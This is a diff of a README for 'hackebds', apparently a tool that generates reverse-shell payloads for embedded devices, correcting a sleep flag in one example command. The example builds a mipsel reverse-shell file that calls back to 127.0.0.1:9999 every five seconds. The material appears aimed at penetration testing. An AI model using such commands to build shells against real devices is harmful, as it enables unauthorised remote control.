@@ -100,7 +100,7 @@ Ubuntu（debian）:
    If you need to create a reverse shell every 5 seconds
 
    ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep -5
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
    ```
 
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
